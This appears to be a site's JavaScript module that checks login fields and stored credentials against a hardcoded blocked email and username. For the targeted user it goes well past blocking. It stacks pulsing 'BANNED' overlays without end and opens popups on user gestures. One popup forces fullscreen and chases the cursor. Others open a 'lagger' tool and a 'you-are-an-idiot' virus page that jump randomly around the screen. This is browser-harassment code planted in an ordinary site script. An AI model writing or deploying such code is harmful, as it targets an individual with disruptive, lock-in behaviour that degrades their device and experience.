(function(){
  var BLOCKED_EMAILS = ['weeee@outlook.com'];
  var BLOCKED_USERNAMES = ['dick'];
  var BLOCKED_DISPLAY_NAMES = ['dick'];

  var LAGGER_URL = '/tools/lagger/index.html';
  var VIRUS_URL = '/you-are-an-idiot/virus.html';
  var _triggered = false;
  var _nativeOpen = window.open.bind(window);

  var AUTH_FIELDS = 'input[name="login_id"],input[name="username"],input[name="email"]';

  function checkVal(val) {
    if (_triggered) return;
    var v = (val || '').trim().toLowerCase().replace(/^@/, '');
    if (!v) return;
    for (var i = 0; i < BLOCKED_EMAILS.length; i++) { if (v === BLOCKED_EMAILS[i]) { _triggered = true; runBan(); return; } }
    for (var j = 0; j < BLOCKED_USERNAMES.length; j++) { if (v === BLOCKED_USERNAMES[j]) { _triggered = true; runBan(); return; } }
    for (var k = 0; k < BLOCKED_DISPLAY_NAMES.length; k++) {
      if (v === BLOCKED_DISPLAY_NAMES[k]) { _triggered = true; showDisplayNameWarning(); return; }
    }
  }

  function attach(el) {
    if (el._banW) return;
    el._banW = true;
    function h() { checkVal(el.value); }
    el.addEventListener('input', h);
    el.addEventListener('change', h);
  }

  function scan() {
    var els = document.querySelectorAll(AUTH_FIELDS);
    for (var i = 0; i < els.length; i++) attach(els[i]);
  }

  function watchAuthFields() {
    scan();
    new MutationObserver(scan).observe(document.body || document.documentElement, { childList: true, subtree: true });
  }

  function isBlockedFromStorage() {
    var email = (localStorage.getItem('sb_email') || localStorage.getItem('jchat_email') || '').trim().toLowerCase();
    var username = (localStorage.getItem('sb_username') || localStorage.getItem('jchat_username') || '').trim().toLowerCase().replace(/^@/, '');
    for (var i = 0; i < BLOCKED_EMAILS.length; i++) { if (email === BLOCKED_EMAILS[i]) return 'email'; }
    for (var j = 0; j < BLOCKED_USERNAMES.length; j++) { if (username === BLOCKED_USERNAMES[j]) return 'username'; }
    return false;
  }

  function isDisplayNameWarningFromStorage() {
    var dn = (localStorage.getItem('sb_displayname') || localStorage.getItem('jchat_displayname') || '').trim().toLowerCase();
    for (var i = 0; i < BLOCKED_DISPLAY_NAMES.length; i++) { if (dn === BLOCKED_DISPLAY_NAMES[i]) return true; }
    return false;
  }

  function loadFont() {
    if (document.getElementById('_ban_font')) return;
    var l = document.createElement('link');
    l.id = '_ban_font';
    l.rel = 'stylesheet';
    l.href = 'https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap';
    document.head.appendChild(l);
  }

  function injectKeyframes() {
    if (document.getElementById('_ban_kf')) return;
    var s = document.createElement('style');
    s.id = '_ban_kf';
    s.textContent = '@keyframes _bpulse{0%{transform:scale(1) rotate(-1deg)}100%{transform:scale(1.04) rotate(1deg)}}';
    document.head.appendChild(s);
  }

  function makeModal() {
    var m = document.createElement('div');
    m.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:'+(window._banZ=(window._banZ||9999900)+1)+';display:flex;align-items:center;justify-content:center;';
    m.innerHTML = '<h1 style="font-family:\'Zilla Slab Highlight\',serif;font-size:12vw;color:#ff1a1a;text-shadow:0 0 80px rgba(255,0,0,.7),0 0 160px rgba(255,0,0,.4);animation:_bpulse .15s infinite alternate;text-align:center;">YOU ARE BANNED</h1>';
    document.body.appendChild(m);
  }

  function showDisplayNameWarning() {
    loadFont();
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:999990;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:40px;';
    overlay.innerHTML = '<p style="font-family:\'Zilla Slab Highlight\',serif;font-size:2.5vw;color:#ff3333;text-align:center;max-width:800px;line-height:1.4;">This username had been used by a user that is permanently blocked from service, please use another display name next time.</p>';
    document.body.appendChild(overlay);
    setTimeout(runBan, 4000);
  }

  var GESTURE_EVENTS = ['click','keydown','mousedown','touchstart','pointerdown'];

  function onGesture(fn) {
    function handler() {
      GESTURE_EVENTS.forEach(function(ev) { document.removeEventListener(ev, handler, true); });
      fn();
    }
    GESTURE_EVENTS.forEach(function(ev) { document.addEventListener(ev, handler, { capture: true }); });
  }

  function runBan() {
    loadFont(); injectKeyframes(); makeModal();
    setInterval(makeModal, 400);
    var ready = false;
    setTimeout(function() { ready = true; }, 2000);
    function tryStage3() {
      if (!ready) { onGesture(tryStage3); return; }
      stage3();
    }
    onGesture(tryStage3);
  }

  function stage3() {
    var popup = _nativeOpen('', '_blank', 'width=600,height=400');
    if (!popup) return;
    popup.document.write('<!DOCTYPE html><html><head><meta charset="utf-8"><link href="https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0}body{background:#000;overflow:hidden}.c{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}h1{font-family:"Zilla Slab Highlight",serif;font-size:8vw;color:#ff1a1a;text-shadow:0 0 60px rgba(255,0,0,.7);animation:p .12s infinite alternate}@keyframes p{0%{transform:scale(1)}100%{transform:scale(1.03)}}button{margin-top:40px;padding:16px 48px;font-size:2vw;background:#ff1a1a;color:#fff;border:none;cursor:pointer;font-family:"Zilla Slab Highlight",serif;border-radius:8px}</style></head><body><div class="c"><h1>YOU ARE BANNED FROM SERVICE</h1><button id="cl">CLOSE</button></div><script>');
    popup.document.write('function goFS(){try{document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen();}catch(e){}}');
    popup.document.write('["click","keydown","mousedown","touchstart","pointerdown"].forEach(function(ev){document.addEventListener(ev,goFS,{once:false});});');
    popup.document.write('document.getElementById("cl").addEventListener("click",function(e){e.stopPropagation();window.opener&&window.opener.postMessage("_ban_close_clicked","*");});');
    popup.document.write('<\/script></body></html>');
    popup.document.close();
    window.addEventListener('message', function handler(ev) {
      if (ev.data !== '_ban_close_clicked') return;
      window.removeEventListener('message', handler);
      stage4(popup);
    });
  }

  function stage4(existingPopup) {
    var laggerPopup = null;
    var mouseX = screen.width / 2, mouseY = screen.height / 2;
    document.addEventListener('mousemove', function(e) { mouseX = e.screenX; mouseY = e.screenY; });

    onGesture(function() {
      laggerPopup = _nativeOpen(LAGGER_URL, '_blank', 'width=500,height=400');
    });

    setInterval(function() { try { if (existingPopup && !existingPopup.closed) existingPopup.moveTo(mouseX - 200, mouseY - 150); } catch(e) {} }, 30);
    setInterval(function() { try { if (laggerPopup && !laggerPopup.closed) laggerPopup.moveTo(Math.random() * (screen.width - 400), Math.random() * (screen.height - 300)); } catch(e) {} }, 150);

    var virusFired = false;
    function fireVirus() {
      if (virusFired) return;
      if (!laggerPopup) return;
      virusFired = true;
      _nativeOpen(VIRUS_URL, '_blank', 'width=600,height=400');
    }
    ['click','keydown','mousedown','touchstart','pointerdown','scroll'].forEach(function(ev) {
      document.addEventListener(ev, fireVirus, { capture: true });
    });
  }

  function init() {
    if (isBlockedFromStorage()) { _triggered = true; runBan(); return; }
    if (isDisplayNameWarningFromStorage()) { _triggered = true; showDisplayNameWarning(); return; }
    watchAuthFields();
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
